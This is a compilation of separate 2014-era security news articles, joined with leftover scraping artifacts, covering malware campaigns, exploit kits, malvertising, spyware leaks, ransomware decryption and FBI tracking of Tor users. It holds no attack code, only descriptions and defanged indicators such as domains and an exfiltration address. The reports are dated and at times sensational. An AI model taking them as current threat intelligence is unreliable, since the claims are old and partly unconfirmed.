JQuery is a free and open source JavaScript library designed to simplify the client-side scripting of HTML. It is used to build AJAX applications and other dynamic content easily. The popular JavaScript library is used by 30 percent of websites, including 70 percent of the top 10,000 most visited websites. James Pleger, Director of Research at Risk management software company RiskIQ, reported yesterday that the attack against jQuery.com web servers launched for a short period of time on the afternoon of September 18th. So, the users who visited the website on September 18th may have infected their system with data-stealing malware by redirecting users to the website hosting RIG. Pleger urged those who visited the site during the alleged attack to re-image their systems, reset passwords for user accounts that have been used on the systems, and also look for any suspicious activity if originated from the offending system or not. \"However, discovering information-stealing malware on jQuery.com is particularly disconcerting because of the demographic of jQuery users [who are] generally IT systems administrators and web developers, including a large contingent who work within enterprises,\" Pleger wrote. Cyber criminals discovered a loophole in the jQuery website’s web properties, backend systems, or other critical infrastructure and injected malicious JavaScript that redirects victims. The RIG exploit kit is often used to deliver banking Trojans and other information-stealing malware. The researcher said he detected malware on compromised machines that steals credentials and other data. \"Planting malware capable of stealing credentials on devices owned by privilege accounts holders inside companies could allow attackers to silently compromise enterprise systems, similar to what happened in the infamous Target breach.\" RiskIQ researchers have immediately notified the jQuery Foundation about the issue. But in response, jQuery Foundation said that their internal investigation into the servers and logs didn't find the RIG exploit kit or evidence that there was a compromise. The Rig Exploit Kit was first spotted in April this year, which checks for an un-patched version of Flash, Internet Explorer, Java or the Silverlight multimedia program on the infected users and if found, the system is instantly exploited by the bad actors. It was also used to distribute Cryptowall Ransomware back in June. UPDATE In an official blog post, Ralph Whitbeck from jQuery.com commented about RiskIQ findings: \"Our internal investigation into our servers and logs have not yet found the RIG exploit kit or evidence that there was in fact a compromise.\" But Yes, \"Currently the only potential system compromised is the web software or server that runs jquery.com.\" and \"At no time have the hosted jQuery libraries been compromised.\" \"Even though we don’t have immediate evidence of compromise, we have taken the proper precautions to ensure our servers are secure and clean.\" he added." }

Few days back, a list of 5 million combinations of Gmail addresses and passwords were leaked online. The search engine giant, Google said that Gmail credentials didn’t come from the security breaches of its system, rather the credentials had been stolen by phishing campaigns and unauthorized access to user accounts. Just now, we come across another similar incident where cyber criminals are using a malware which has already compromised thousands of Windows users worldwide in an effort to steal their Social Media account, Online account and Banking account Credentials. A Greek Security Researcher recently discovered a malware sample via a spam campaign (caught in a corporate honeypot), targeting large number of computers users rapidly. He investigated and posted a detailed technical analyses of the malware on his blog. After reverse engineer the malware sample file, he found that the cybercriminals are using a combination of software AutoIT (Automate day-to-day tasks on computers) and a \"commercial\" Keylogger named \"Limitless Keylogger\" to make it FUD i.e. Fully Undetectable from static analysis. Keylogger is a critical type of software program for cyber criminals, which records every input typed into the keyboard and easily detects passwords for users’ Email accounts, Social Media accounts and Online Bank accounts. This malicious application captures every keystrokes users press and send them to a specified email address linked to the cyber criminal. More interestingly, the malware uses AutoIT in order to evade detection by Antivirus programs. The malware distributed in the spam campaign comes as a WinRAR SFX executable file with a custom icon which drops 4 malicious files onto the victim’s computers with hidden and system attributes. The Malware archive includes: AutoIT script ‘update.exe’ of 331MB Python script to “deobfuscate” AutoIT script oziryzkvvcpm.AWX - Settings for AutoIT script sgym.VQA – Another Encrypted malware/Payload Binary Initially the obfuscated AutoIT Script is of size 331MB, because it contains lots of garbage content, but after deobfuscate process it becomes only 55kbyte in size with clean malicious code. Researcher found lot of functions and various functionalities in the malware code those allow the malicious software to protect itself from detection. On Further reserve engineering, he found that the malware sends the collected keystroke data to the cybercriminal via SMTP email server. So he sniffed the whole conversation of malware SMTP traffic and discovered that the keylogger was sending all keystrokes of the user, screenshots, recovery data (saved passwords from several applications/browsers) to an email ID - “ontherun4sales@yandex.ru”. He also extracted the hardcoded SMTP email ID username and passwords of the respective Yandex mail address from the malware source code. Researcher told SecNews, “The detection was accomplished in the past few days and found that the malware was being Greek is targeting users (minimum numerical cases).” “Possibly some Indonesian hackers might have used the malicious software available on the Russian hacking forum sites” they said. \"and the targets are well known companies from retail industry,oil,airlines etc\" At last, the researcher also disclosed some online FTP servers using Google hacks, where the data has been uploaded by the different variants of the Limitless Logger by various hacking groups." }

A recent report published by the researcher of the security vendor Malwarebytes suggests that the cyber criminals are exploiting a number of websites, including The Times of Israel, The Jerusalem Post and the Last.fm music streaming website, to serve malicious advertisements designed to spread the recently identified Zemot malware. Malvertising is not any new tactic used by cybercriminals, but Jerome Segura, a senior security researcher with Malwarebytes, wrote in a blog post that his company “rarely see attacks on a large scale like this.” \"It was active but not too visible for a number of weeks until we started seeing popular sites getting flagged in our honeypots,\" Segura wrote. \"That's when we thought, something is going on.\" The first impressions came in late August, and by now millions of computers have likely been exposed to Zemot, although only those with outdated antivirus protection were actually infected. According to Segura, the malicious advertisements lead users to websites containing Nuclear exploit kit, which looks for an unpatched version of Adobe Flash Player or Internet Explorer running on victim’s system. If found one, it downloads the Zemot malware, which then communicate it to a remote server and downloads a wave of other malicious applications. However, by the time the malware was spotted, millions of computer machines may already have been exposed to Zemot, the researcher said, but at the mean time he also added that only those users with out-of-date antivirus software protection were actually infected by the malware. The Zemot malware was identified by Microsoft earlier this month. According to Microsoft, Zemot is usually distributed not only by the Nuclear exploit kit but also by the Magnitude exploit kit and spambot malware Kuluoz. The malware focuses on computers running Windows XP, although it can also infect more modern operating systems running on x86 and 64 bit machines. The malware can easily bypass the security softwares installed in the system before infecting computers with additional malware, therefore it is difficult to identify the attack it poses on a system. A Google representative has confirmed the breach, and said that the team was aware of the breach and has since shut down all the affected servers which were redirecting malicious code, and have disabled the ads that delivered malware to user’s computers, reported The Verge." }

The campaign is dubbed as 'Harkonnen Operation' and involved more than 800 registered front companies in the UK — all using the same IP address – that helped intruder installs malware on victims' servers and network equipments from different organizations, mainly banks, large corporations and government agencies in Germany, Switzerland and Austria. In total, the cyber criminals made approximately 300 corporations and organisations victims of this well-organised and executed cyber-espionage campaign. CyberTinel, an Israel-based developer of a signature-less endpoint security platform, uncovered this international cyber-espionage campaign hitting Government institutions, Research Laboratories and critical infrastructure facilities throughout the DACH (Germany, Austria, Switzerland) region. From the analysis and research work done by CyberTinel, it is believed that the hackers had first penetrated computer networks as far back as 2002 and, according to Elite Cyber Solutions chief executive Jonathan Gad, the damage done to companies since then was \"immeasurable\". \"The network exploited the UK’s relatively tolerant requirements for purchasing SSL security certificates, and established British front companies so they could emulate legitimate web services,\" said Jonathan Gad, chief executive of distributor Elite Cyber Solutions, Cybertinel’s UK partner. \"The German attackers behind the network then had total control over the targeted computers and were able to carry out their espionage undisturbed for many years.\" He added, \"At this point, we are aware of the extent of the network, but the damage to the organisations who have been victims in terms of loss of valuable data, income or the exposure of information related to employees and customers is immeasurable.\" The Harkonnen Operation attack was detailed in a special report [pdf] titled, \"HARKONNEN OPERATION CYBER-ESPIONAGE,\" in which the researchers analysed and discovered companies that were compromised by seemingly generic trojans foisted through spear-phishing attacks. The fact that the malware was installed via spear-phishing attacks from companies that appear legitimate — with the appropriate digital security certificates — gave the cyber criminals even more anonymity, enabling them to hit very secure servers and steal all types of top-secret documents. The trojans detected in the attacks were GFILTERSVC.exe from the generic trojan family Trojan.win7.generic!.bt and wmdmps32.exe. It is still unclear that who or what is behind the hack, but researchers believe that the malware campaign seems to be more like an organised crime operation than something a government intelligence agencies would do. The scammers invested over $150,000 — a kingly sum for hackers — on hundreds of domain names, IP addresses and wildcard certificates to make its UK businesses appear legitimate. and in keeping the operation going." }

The Israeli think tank website JCPA – an independent research institute focusing on Israeli security, regional diplomacy and international law – was serving the Sweet Orange exploit kit via drive-by downloads to push malware onto the computers of the website's visitors by exploiting software vulnerabilities, researchers from security firm Cyphort reported on Friday. The Sweet Orange is one of the most recently released web malware exploitation kits, available for sale at selected invite-only cyber crime friendly communities and has been around for quite some time. However, Sweet Orange has also disappeared but in October 2013, shortly after the arrest of Paunch, the author of BlackHole, experts observed a major increase in the use of Sweet Orange. The analysis carried out by Cyphort security firm indicates that the attack on JCPA website is part of a wide malware campaign. It has been discovering several infected website on daily bases and found an initial redirection server as a common thread between the attacks. Following the initial redirection server, Cyphort notes that the innocent users from music industry and law firms are being redirected to a link in the infection chain. Ultimately, users are led to an exploit server located in Russia. “This is a sinkhole that is connected to many such varying domain names,” explains McEnroe Navaraj of Cyphort. “All of these names have some string of ‘cdn’ in them. Once the bad actors get access to an account/server they can just create a corresponding ‘cdn’ domain entry under that domain and use it to point to the target exploit server.” This method allows an attacker to bypass a lot of the URL categorization and URL blacklisting technologies. The JCPA website’s homepage is infected with a malicious Jquery JavaScript file. The Jquery JavaScript file receives an exploit kit server URL from another domain, “cdn[dot]jameswoodwardmusic[dot]com.” Ultimately, the exploits are served from “cdn3[dot]thecritico[dot]com:16122/clickheat/stargalaxy.php?nebua=3.” Finally, the user is attacked via a series of Java and Internet Explorer exploits that were used to deliver an information-stealing Trojan dubbed Qbot. “The final dropper is downloaded in encrypted form and decrypted in-memory (key: investor) and written to disk,” Navaraj explains. “This exploit kit served two (Qbot) binaries with same hash (MD5: 4ff506fe8b390478524477503a76f91a). Encrypted binary transfer is done to hide it from signature-based network security devices such as IPS or AV gateways.” The malware has self modifying capability as well as anti-virtual machine and anti-antivirus detection modules built in, in order to evade detection. Once infected a machine, the malware has capability to steal machine operating system install dates, names, and product IDs. But most weirdly, the malware contains a link to an flv file for a “Wheat Thins” advertisement, which indicates that probably the attackers are using the malwares as a click-fraud to make some extra dollars. Meanwhile, the malware also attempts to block users from accessing various anti-virus companies websites, as well as steals login credentials from a long list of prominent banks, including PNC, Zions Bank, Sovereign Bank, SunTrust, Bank of America, J.P. Morgan, Wells Fargo, Citi Bank, Wachovia, TD Bank and many more. The security firm says it has notified the think tank via the contact form on its website, but received no response." }

It was believed that the group of hackers allegedly taken celebrities photos from their Apple iCloud backups after their iCloud accounts were compromised, but users of devices running Google's Android could have been targeted too. A forum post on anonymous image board AnonIP shows that the group of hackers may have used a cloned Flappy Bird app to steal and collect the naked photos of females from their Android devices and then send them to remote servers. Experts believe that the group may have been stealing and trading nude and very personal photos of more than 100 female celebrities for more than two years, gathered on the “stolen” forum on image board AnonIB. The developer of fake Flappy Bird app took advantage of the user's \"carelessness\" of granting the permissions to Android apps. The post on a hackers' forum, written in late July this year, was discovered by security consultant Nik Cubrilovic. It detailed how the supposed developer had developed a malware-ridden “clone” of Flappy Bird app for Android devices that would exploit app permissions granted during installation in an effort to steal the photos. “I am a fucking genious [sic]… Hear me out. I.. modded… the app,” the developer explained in the post. “It now secretly downloads all of the phones pictures to my server when the game is running. Note: this app will only work for android,” he added. The developer want to release a copy of cloned Flappy Bird app on the Google’s Play Store but he didn’t want to risk his developer license, as the app violates Google play’s terms. But, to solve the problem, he was searching for a second developer account, specifically created for the purpose of stealing pictures from infected Android devices. He also asked for financial support from his fellow anons in order to make a second Google Play developer account and promises to “post any wins [stolen photos] obtained in this thread.” A new developer licence cost $20. All game is based on the users’ negligence to check the permissions of mobile apps they granted without even knowing of the fact that any app is asking access to your device’ stored photographs. It is extremely phishy, but many of you don’t even pay attention to these details and accept those permissions blindly. Flappy Bird, developed by a 29-year old, Dong Nguyen, was one of the top free gaming apps on Google’s Play Store. But after the developer of Flappy Bird pulled the gaming app from both the Apple and Google app stores, it led to the creation of dozens and dozens of Flappy Bird clones, out of which many identified as malicious." }

Security experts at TrendMicro believe that the malware is triggered by opening Facebook or Twitter via shortened links provided in any social networking websites. Once clicked, the links may lead victims to a site that automatically downloads the malicious browser extension. MALWARE INVOLVES DOWNLOADING MULTIPLE MALICIOUS FILES The process is quite complicated as the malware drops a downloader file which downloads multiple malicious files on the victim’s computer. Moreover, the malicious program also has ability to bypass Google's recent security protection added to Chrome against installation of browser extensions that are not in Chrome Web Store. Researchers came across a baiting tweet that advertises “Facebook Secrets”, claiming to show videos that are not publicly available, along with a shortened link that is to be clicked in order to get it. Curious users easily fall victim to such campaign and click the given links to download those videos. What the user totally unaware of is that the file which he downloaded is a malware dropper with the name “download-video.exe”, detected as TROJ_DLOADE.DND, according to fraud analyst Sylvia Lascano of the security firm Trend Micro. This malicious file then is used to drop additional malware into the victims’ computer, one such is a Chrome browser extension which masquerades as Flash Player, which could be used for more offensive threats designed to steal victims’ credentials for various online services. MALWARE BYPASSES GOOGLE’S SECURITY POLICY In order to evade detection, the malware circumvents Google's security policy – which only allows extension installations hosted in the Chrome Web Store – by creating a folder in the browser's directory where it drops “browser extension components.” The browser extension components that needs to be loaded are added to Chrome’s extension folder are as follows: manifest.json – contains browser extension description like name, script to load, version, etc. crx-to-exe-convert.txt – contains the script to be loaded, which can be updated anytime by connecting to a specific URL. After all the data is parsed by the browser in the dropped component manifest.json, the extension is ready to work. OPEN FACEBOOK OR TWITTER – BE A VICTIM OF CLICK FRAUD Once installed, if a user visits Facebook or Twitter, the extension quietly opens a specific site in the background that is written in Turkish, which researchers believe is part of a click fraud or redirection scheme. “The site is written in Turkish and phrases such as ‘bitter words,’ ‘heavy lyrics,’ ‘meaningful lyrics,’ ‘love messages,’ and ‘love lyrics’ appear on the page. This routine could be a part of a click fraud or redirection scheme,” fraud analyst Sylvia Lascano of the security firm Trend Micro said in a blog post. SHORTENED LINK HELPED THREAT ACTORS By the time researchers discovered the campaign, the tweets promoting the sophisticated malware dropper had been retweeted more than 6,000 times. Here cyber criminals took help of shortened link in order to victimize a large number of victims because of the fact that the shortened link don’t have visibility of where it directs, and contributes to spreading the campaign. So, in order to protect your computers against this sort of threats, avoid accessing links from any unknown and suspicious sources." }

But with time, cyber criminals and malware authors have found ways to exploit Mac as well. GROUP BEHIND THE MAC VERSION OF BACKDOOR Researchers have unmasked a group of cyber criminals that has recently started using a new variant of XSLCmd backdoor program to target Mac OS X systems. This Mac version of backdoor shares a significant portion of its code with the Windows version of the same backdoor that has been around since at least 2009. According to FireEye researchers, the group, dubbed as GREF, is already infamous for its past cyber espionage attacks against the US Defense Industrial Base (DIB), companies from the electronics and engineering sectors worldwide, foundations and other NGO’s as well. \"We track this threat group as “GREF” due to their propensity to use a variety of Google references in their activities – some of which will be outlined later in this report. Our tracking of GREF dates back to at least the 2009 timeframe, but we believe they were active prior to this time as well.\" researcher said. WINDOWS MALWARE NOW TARGETING MAC OS X The malicious program used by the group has ability to open a reverse shell, list and transfer files and install additional malware on the computer it infects. The Mac version of backdoor can also log keystrokes as well as capture screenshots. The group has been using the same XSLCmd backdoor to target Windows users for years. “The backdoor code was ported to OS X from a Windows backdoor that has been used extensively in targeted attacks over the past several years, having been updated many times in the process,” security researchers from FireEye said Thursday in a blog post. HOW BACKDOOR HIDE ITSELF Once installed on a Macintosh computer, the malware copies itself to /Library/Logs/clipboardd and $HOME/Library/LaunchAgents/clipboardd. The malware also creates a com.apple.service.clipboardd.plist file to ensure its execution after the system reboots. The code contained in the malware checks for the OS X version of the devices, but account for version 10.8 (Mountain Lion) and versions older than that. This indicates that the malware lack in support for OS X version 10.9, the current version of Mac. Indeed, this specific sample of malware \"..uses an API from the private Admin framework that is no longer exported in 10.9, causing it to crash.\" GROWING MARKET OF MAC MALWARE In a follow-up blog titled, Apple OS X: Security Through Obscurity is becoming an Absurdity, FireEye researchers mention Forrester in claiming that the usage of Apple devices is growing rapidly with 52 percent of newly issued computers in the enterprise being Macs. Since 41 percent of enterprise including VIPs, executives and manager level employees are Apple users, they automatically becomes the prime and rich targets of the cyber criminals. So, cyber criminals are trying every effort to turn malicious and complex Windows malwares to target Mac users." }

As part of this campaign, users of several high-profile websites including Java.com, Deviantart.com, TMZ.com, Photobucket.com, IBTimes.com, eBay.ie, Kapaza.be and TVgids.nl, last week were redirected to websites serving malicious advertisements that infected visitors by installing botnet malware on their computer, said security company Fox-IT. “These websites have not been compromised themselves, but are the victim of malvertising. This means an advertisement provider, providing its services to a small part of a website, serves malicious advertisement aimed at infecting visitors with malware,” researchers at Fox-IT said in a blog post. Angler exploit kits are available on the underground black forums and are used in various malicious campaigns to own websites and redirect users off to websites hosting banking malware and other types of malicious code in order to victimize them. “Please note, a visitor does not need to click on the malicious advertisements in order to get infected. This all happens silently in the background as the ad is loaded by the user’s browser,” researchers warned. According to the Researchers, Angler first checks whether the victim’s browser supports an outdated versions of Java, Adobe Flash Player or Microsoft Silverlight, and then silently install a variant of the Asprox botnet malware. Asprox is generally a spam botnet that was involved in multiple high-profile attacks on various websites in order to spread malware. The malware recently has been modified for click-fraud and cyber criminals are using it to spread malware through email attachments with exploit kits. It also has other malicious functionality including scanning websites for vulnerabilities and stealing log-in credentials stored on computers. “Asprox has gone through many changes and modifications which includes spam modules, website scanning modules and even credential stealing modules,” Fox-IT said. “This history and current events show Asprox is still actively being developed and used.” Once visited on a site hosting the malicious ad, users are redirected in the background to ads[.]femmotion[.]com, which then redirects to the exploit kit on a number of other domains, the gloriousdead[.]com and taggingapp[.]com. “All the exploit kit hosts were observed using port 37702. Running exploit kits on high ports at best prevents certain network tools from logging the HTTP connections, as these are typically configured to monitor only HTTP ports,” Fox-IT said. “It does mean this exploit kit is blocked on a lot of corporate networks as they do not allow for browsing outside the normal HTTP ports, port 80 (or proxy ports) and 443 for SSL.” In order to show targeted advertisements to users, advertisers engage in an automatic, real-time bidding process, which makes malicious advertisements more difficult to track. “In the case of this malvertising campaign the malicious advertisers were the highest bidders,” Fox-IT says. Hackers used a method called “retargeting”, which is actually used by Digital Advertising agencies to rotate the ads shown to the same visitor when they access a specific page multiple times. “The way it works is that a user with an interesting set of tracking cookies and other metadata for a certain adprovider is retargetted from the original advertisement content on the website to the modified or personalized data,” Fox-IT researchers said. “We have seen examples where the website that helped with the ad redirect to infect a user had no idea it was helping the delivery of certain content for a certain ad provider.”" }

According to a recent research paper published on Virus Bulletin by the Security Researcher Axelle Apvrille, the malware, also known as \"spad,\" was first discovered by security researcher Claud Xiao in March this year. Till now, AdThief aka Spad malware has hijacked an estimated 22 million advertisements and stealing revenue from developers on the iOS jailbreak community, Axelle Apvrille says. The malware allegedly infects iOS jailbroken devices by disguising itself as Cydia Substrate extension, presents only on jailbroken Apple devices, when a malware infected Cydia package is downloaded and installed by the unsuspecting user. Once installed, the malware modifies certain advertisements displayed on your iOS devices in an effort to redirect all the revenues to malware developer. In short, if you download or install a free ad-supported iOS app from the App Store, all of the cash generated by that app goes to the cyber criminal behind AdThief rather than the app’s developer. \"In other words, each time you view or click an ad on an infected device, the corresponding revenue goes to the attacker, and not to the developer or the legitimate affiliate,\" Apvrille said. \"[AdThief] hooks various advertisement functions and modifies the developer ID (promotion ID) to match that of the attacker.\" Adthief has targeted advertisements from 15 popular mobile advertising networks, including Google’s AdMob and Mobile Ads, AdWhirl, MdotM, and MobClick, four of which were based in the US, two in India and the remainder in China. The security researcher was able to identify the targets because the hacker mistakenly forgot to remove identifying information from the code. Further investigation allowed Apvrille to identify the coder who ran a blog providing details of various Android hacks, a Github and inactive Twitter account. Researcher located a Chinese vxer Rover 12421 who admitted writing the AdThief code but denied propagating it. According to the researcher, the number of infected devices by the malware is small if compared to the figure of iOS devices in use, attackers likely generated significant revenue with an estimated 22 million advertisements hijacked. The most important thing about this particular hack is that there is no way to find out if your device is infected by AdThief malware, because it runs in the background and is almost impossible to detect. Users of unmodified iOS devices need not to worry as they are safe from this malware infection. Users of jailbroken Apple iOS devices are recommended to avoid downloads from untrusted repositories. Always be careful about adding new sources, and also be suspicious of those sources that promise pirated downloads of paid apps or tweaks." }

Is that the Syrian government behind the blackout ? The outage took place during a period of intense fighting in the country’s still-ongoing civil war. So, it was supposed that may it be the government’s fault. But, the Syrian Minister of Information said that the government didn’t disable the Internet, instead the outage was caused by a cable being cut by some terrorists. When investigated, it was unlikely to be the case. So, Who was actually behind Syria Blackout ? NSA? Yup! It was the same NSA who was behind a number of major happenings. National Security Agency (NSA) – the God-like powered agency that had ruled over the privacy of the entire world from countries to individuals, the one with master access to read anyone’s data, intruded into large fiber networks, and can target anyone, at any time and at any place. SECRET BEHIND SYRIA’S 2012 INTERNET BLACKOUT The new revelation from the global surveillance whistleblower Edward Snowden remove the mask from one more Agency’s secret – a 2012 incident that took Syria’s Internet offline was caused by a blunder made by none other than the National Security Agency. In an interview with Wired magazine’s well-known NSA journalist James Bamford published today, Snowden said that the elite hacking unit in the NSA, very well known as Tailored Access Operations (TAO), accidentally took most of Syria off the Internet while attempting to infiltrate the country's traffic. WHAT IF NSA SUCCESSFUL The TAO unit had allegedly been attempting to install malware by exploiting a vulnerability in the router of Syria’s main Internet service provider that would have allowed the agency to redirect traffic from the central router through systems tapped by NSA’s Turmoil packet capture system and the Xkeyscore packet processing system. This would have given the agency access to enclosures in e-mails that would otherwise not have been possible by its wider Internet surveillance program. THAT Oops ! MOMENT Instead, the TAO’s hackers successfully executed it, the plan backfired as the unit accidentally rendered the router - a very equipment it was trying to tap, causing Syria's internet connection to go dark. Snowden described the incident as an “oh shit” moment at the Tailored Access Operations center, where NSA feared of the moment if the Syrian government would discover what they had done. The incident was really ironic - where other parts of the U.S. government were trying to keep Syria connected, the TAO unit was trying to repair the router and cover its tracks, to no avail. “Fortunately for the NSA, the Syrians were apparently more focused on restoring the nation’s Internet than on tracking down the cause of the outage,” Bamford wrote. Snowden told him that someone joked, “If we get caught, we can always point the finger at Israel.” It had been largely assumed that the outage had been caused by one of the opposing parties within Syria, be it the government itself or rebels. It was thought because since then, a number of times Syria's internet has gone dark, so it isn't wrong to continue assuming the same when outages occur. While the Syrian government blamed dissenting \"terrorists\" for the outage caused. This recent Snowden's disclosure describes an embarrassing part of US intelligence agency though, but at the same time, the disclosure also made the list of culprits that people will consider when similar incidents occur in the future." }

This time, an old Facebook scam is back in action once again! Malicious Facebook \"Color Changer\" app has resurfaced again on the popular social networking site Facebook, this time compromising more than 10,000 people worldwide. The malicious app promises users to change the characteristic blue colour of Facebook’s header and interface to one of nine other colours including pink, purple, green, yellow, orange and black, in order to infect users’ phones and computers with malicious software. Researchers at China-based Internet company Cheetah Mobile have detected the “Facebook colour changer” that tricks Facebook users into downloading the app via a malicious phishing site. The phishing website targets users in two ways: First of all, it steals the users' Facebook Access Tokens by asking them to view a color changer tutorial video,which allows hacker to connect to the victim’s Facebook friends. If the user doesn’t watch the video, the site then tries to get them to download the malicious color changer application, in order to infect their systems with malware. However, PC users are lead to a bogus site to download a pornographic video player, and Android device users are issued a warning saying their device has been infected and advised to download a suggested application. According to the researchers at Cheetah Mobile, the problem stems from \"a vulnerability that lives in Facebook’s app page itself, allowing hackers to implant viruses and malicious code into Facebook-based applications that directs users to phishing sites.\" The new color changer app has affected Facebook users in several countries but this is not the very first time it has happened before, according to Cheetah Mobile's security researchers. Facebook has become Number 1 social networking website with more than one billion active users this year. Hundreds of people join the social networking website everyday. On the other hand, with the increase in popularity, Facebook also serves as a great and useful platform for scammers and falling victim to such scams is very simple. So here’s what you can do in order to protect yourself from this threat. Follow these steps: Realize there’s no way to customize your Facebook with an app Do not click any link which suggests otherwise Even if the link suggests it’s heading toward an Official Facebook Page - DO NOT TRUST IT But, for those who have already installed the app should uninstall the app straight away and change their Facebook account password. To prevent further problems we suggest you to completely turn off Facebook's apps platform, and install a trusted security application to your devices. Remember, there is absolutely no friendly way to change the color of your Facebook. You can only customize your Facebook account or page by adding any of your other profile photo and a different header image through your normal Facebook settings - That’s it!" }

The highly secret surveillance software called “FinFisher” sold by British company Gamma International can secretly monitors computers by turning ON webcams, recording everything the user types with a keylogger, and intercepting Skype calls, copying files, and much more. A hacker has claimed on Reddit and Twitter that they'd infiltrated the network of one of the world's top surveillance & motoring technology company Gamma International, creator of FinFisher spyware, and has exposed 40GB of internal data detailing the operations and effectiveness of the FinFisher suite of surveillance platforms. The leaked information was published both on a parody Gamma Group Twitter account (@GammaGroupPR) and Reditt by the hacker that began publishing links to the documents and satirical tweets. The leaked files includes client lists, price lists, source code of Web Finfly, details about the effectiveness of Finfisher malware, user and support documentation, a list of classes/tutorials, and much more. The Reddit post Gamma International Leaked in self.Anarchism said, “a couple days ago [when] I hacked in and made off with 40GB of data from Gamma's networks. I have hard proof they knew they were selling (and still are) to people using their software to attack Bahraini activists, along with a whole lots of other stuff in that 40GB.” The FinFisher files were first leaked on Dropbox as a torrent file and since have been shared across the internet, which means that it is now impossible to stop the information from being leaked. One spreadsheet in the dump titled FinFisher Products Extended Antivirus Test dated April this year, details the anti-virus detection rates of the FinFisher spyware which German based Gamma Group sold to governments and law enforcement agencies. It shows how FinFisher performed well against 35 top antivirus products. That means FinFisher would probably not be detected by a targeted users' security systems. One more document also dated April this year has been identified that detailed release notes, for version 4.51 of FinSpy, show a series of patches made to the products including patch to ensure rootkit component could avoid Microsoft Security Essentials, that the malware could record dual screen Windows setups, and improved email spying with Mozilla Thunderbird and Apple Mail. The file dump also reveals that FinFisher is detected by OS X Skype (a recording prompt appears), so the users of OS X Skype would be alerted to the presence of FinFisher by a notification indicating that a recording module was installed. FinFisher cannot tap Windows 8 users, so rather the desktop client, the users should opt for the Metro version of Skype. The dump also contains a fake Adobe Flash Player updater, a Firefox plugin for RealPlayer and an extensive (though still undetermined) documentation for WhatsApp. “A price list, which appeared to be a customers' record, revealed the FinSpy program cost 1.4 million Euros and a variety of penetration testing training services priced at 27,000 Euros each,” the Reg. reported. “The document did not contain a date but it did show prices for malware targeting the recent iOS version 7 platform.” The leaked documents also included a FinSpy user manual and brochure. This previously kept so-called spying secret is not a secret now and we’ll be going to find a lot more in the upcoming weeks. Stay Tuned!" }

A nasty strain of ransomware malware that threatened most of the people around the world by effectively destroying important files of the victims forever. CRYPTOLOCKER - A DEVASTATING THREAT CryptoLocker is a simple rather a devastating piece of Ransomware that encrypts the files on a victim’s computer and issues an ultimatum - Pay up or lose your data. CryptoLocker is particularly designed to extort money from computer users by holding computer files hostage until the computer user pays a ransom fee to get them back. Cryptolocker hijacker sniffs out your personal files and wraps them with strong AES-256-bit encryption before it demands money. HOW TO DECRYPT CRYPTOLOCKER? FREE TOOL RELEASED Thanks to security experts, who created an online service where victims whose systems have been encrypted by the CryptoLocker ransomware can get the decryption keys for free. This online portal has been created by the security researchers from Security software and services firms Fireeye and Fox-IT. The researchers created the portal after they used a copy of CryptoLocker's database of victims that was obtained during the recent takedown of the GameOver Zeus botnet, which was used to distribute the ransomware. \"This time we basically got lucky,\" said Michael Sandee, principal analyst at Fox-IT, one of the security firms which helped uncover the cybercrime group behind Cryptolocker. The infrastructure of Cryptolocker and other malware was taken down in June under a campaign known as Operation Tovar, but there are still many cases where this nasty strain of ransomware is infecting users, according to Fireeye. “After the success of Operation Tovar, there were few resources available to help decrypt files that were still encrypted with the attacker’s private key,” Fireeye explains in a blog post. CRYPTOLOCKER DEMANDS $500, BUT ONLINE DECRYPTION TOOL IS FREE Where CryptoLocker ransomware forced its victim to pay upto $500 in Bitcoins within 72 hours for the private keys necessary to unlock personal files, on the other hand, the security firms are providing the private decryption keys for free via the just-launched Decrypt CryptoLocker website. According to FBI estimates from June, more than 500,000 people fell victim to CryptoLocker between September 2013 and May 2014. Fox-IT says around 1.3 percent of victims paid to free their files, which indicates, the malware earned its makers around $3 million before the criminal network was smashed by authorities and security researchers in May. HOW TO DECRYPT FILES INFECTED BY CRYPTOLOCKER You only need a master decryption key in order to decrypt the locked files. Go to https://www.decryptcryptolocker.com Upload an email address and one of the encrypted files (one that should have no sensitive information). The online tool will scan the file to figure out the encryption specifics, and then send you a recovery program and master decryption key via an email. You can take that key and the free decryptolocker.exe command line tool and decrypt your files. FireEye warns that some data might not be recoverable, particularly if you've been infected by a CryptoLocker variant rather than CryptoLocker itself. You need to keep this in mind that there are many Cryptolocker variants with the names like PrisonLocker, CryptoDefense, TorLocker and CryptorBit, so the tool may not work against them.

Just a few days back, Tor made a difficult announcement that an attack on its system likely exposed its users of anonymity. Now, a new report from Wired suggests that the FBI has been running a malware campaign to identify Tor users by infecting their computers for years on a large scale. FBI USES DRIVE-BY HACKING TO TRACK USERSTor is generally thought to be a place where users come online to hide their activities and remain anonymous, but a court case has revealed an opposite story. FBI has been using a tactic called drive-by hacking to track computers using the Tor anonymous computing system. Security researchers call the tactic a “drive-by download” in which a hacker infiltrates a high-traffic website to deliver the malware to large swaths of visitors. That simply means that the FBI first infects the target sites and then installs malware to tracks its users. PARTICULARLY TARGETING DARKNET WEBSITESUnder the Operation Torpedo, the FBI agents are using drive-by hacking particularly to track users on the Dark Net, hidden websites that are only accessible through Tor anonymity network. These dark websites usually deal in serious activity like drugs, child porn and murder contracts. Like the 2012 case of Aaron McGrath, who was found hosting child pornography websites on a network of servers in Nebraska. After obtaining legal warrants to track certain individuals accessing McGrath's servers, the FBI agents infected servers with tracking malware to identify the root IP of anyone who visited the website. As a result, the FBI were successful in tracking the IP address of as many as 25 individuals in this case. To the FBI’s credit, it has owned up to these techniques in the past and tracked users across Tor before. YOU MIGHT BE IN DANGER IF USING TORThis sophisticated use of tracking malware comes out to be a great tool to help law enforcement find and arrest the terrible criminals. But, in past we had seen some evidence that the FBI is tracking innocent users of Tor anonymity network, as well. Many are worried about this tracking tactic that is also used to track people legally visiting other suspicious sites like researchers or human rights workers. “You could easily imagine them using this same technology on everyone who visits a jihadi forum, for example,” the ACLU technologist Chris Soghoian told Wired. “And there are lots of legitimate reasons for someone to visit a jihadi forum: research, journalism, lawyers defending a case. ACLU attorneys read Inspire Magazine, not because we are particularly interested in the material, but we need to cite stuff in briefs.” Nobody is sure whether the innocent Tor users are targeted in this so-called Operation Torpedo, but the FBI agents are expected to use these drive-by download tools in near future as well. As they don’t have to reveal exactly what they are doing, just because of the fact that they’re hacking only into the unsuspecting Americans’ computers is going to be unnoticed by the judges. The ACLU is also worried that judges issuing the legal search warrants to the FBI which make these tracking malware attacks legal, don't fully understand the technology. In fact, the search warrants for the Operation Torpedo, didn't actually contain the word like malware anywhere. So, if you are also the one to use Tor to legally access potentially dangerous sites, no matter for what purpose you are there - THE FBI HAS AN EYE ON YOU." }

